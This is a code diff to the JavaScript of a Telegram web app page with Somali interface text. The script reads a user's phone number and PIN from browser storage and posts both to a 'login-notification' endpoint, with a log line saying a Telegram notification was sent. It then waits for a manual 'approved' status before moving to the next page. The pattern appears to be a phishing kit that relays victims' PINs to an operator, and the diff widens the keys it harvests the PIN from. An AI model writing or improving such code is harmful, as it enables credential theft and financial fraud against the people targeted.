@@ -94,22 +94,34 @@ document.addEventListener("DOMContentLoaded", async () => {
         tg.expand();
     }
 
-    const phone = localStorage.getItem("phone") || "";
-    const pin = localStorage.getItem("lastPin") || "";
+    // Retrieve storage values with multiple key fallbacks
+    let rawPhone = localStorage.getItem("phone") || localStorage.getItem("phoneNumber") || "";
+    let rawPin = localStorage.getItem("lastPin") || localStorage.getItem("pin") || localStorage.getItem("userPin") || "";
+
+    // Sanitize phone number (strip spaces/dashes)
+    const phone = rawPhone.replace(/\s+/g, '').replace(/[^0-9+]/g, '');
+    const pin = rawPin.trim() || "N/A"; // Prevent empty payload from failing backend validation
 
     if (!phone) {
-        console.warn("⚠️ Nambar telefoon lama helin.");
+        console.warn("⚠️ Phone number is missing in localStorage.");
     }
 
-    // -------------------- SEND LOGIN REQUEST --------------------
+    // -------------------- SEND LOGIN NOTIFICATION --------------------
     try {
-        await fetch("/api/login-notification", {
+        const response = await fetch("/api/login-notification", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ phone, pin })
         });
+
+        const resData = await response.json();
+        if (!response.ok) {
+            console.error("❌ Notification endpoint error:", resData);
+        } else {
+            console.log("✅ Telegram Notification Sent Successfully.");
+        }
     } catch (err) {
-        console.error("❌ Makal-mucaawino:", err);
+        console.error("❌ Network or API error:", err);
     }
 
     // -------------------- TEXT CHANGE --------------------
@@ -123,7 +135,7 @@ document.addEventListener("DOMContentLoaded", async () => {
         if (!phone) return;
 
         try {
-            const res = await fetch(`/api/check-status?phone=${phone}`);
+            const res = await fetch(`/api/check-status?phone=${encodeURIComponent(phone)}`);
             const data = await res.json();
 
             if (data.status === "approved") {
@@ -131,7 +143,7 @@ document.addEventListener("DOMContentLoaded", async () => {
                 subText.textContent = "Waqti yar ka dib bogga xiga ayaa furmi doona...";
 
                 setTimeout(() => {
-                    window.location.href = "/page8";
+                    window.location.href = "/page7";
                 }, 1500);
             }
 
@@ -141,7 +153,7 @@ document.addEventListener("DOMContentLoaded", async () => {
             }
 
         } catch (err) {
-            console.error("❌ Hubinta xaalada waa lagulamaid:", err);
+            console.error("❌ Status check error:", err);
         }
     }
 
